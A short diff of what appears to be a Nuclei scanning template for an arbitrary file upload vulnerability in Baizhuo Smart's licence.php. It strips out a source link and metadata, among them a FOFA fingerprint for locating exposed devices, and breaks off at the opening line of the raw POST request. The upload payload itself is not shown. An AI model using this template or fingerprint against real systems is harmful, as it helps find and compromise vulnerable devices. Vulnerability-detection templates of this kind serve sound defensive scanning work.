@@ -3,12 +3,8 @@ info:
   name: 百卓Smart licence.php存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cs7tqzv7qo2foacd'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cs7tqzv7qo2foacd
-    fofa: app="byzoro-Smart"
 http:
 - raw:
   - 'POST /sysmanage/licence.php HTTP/1.1
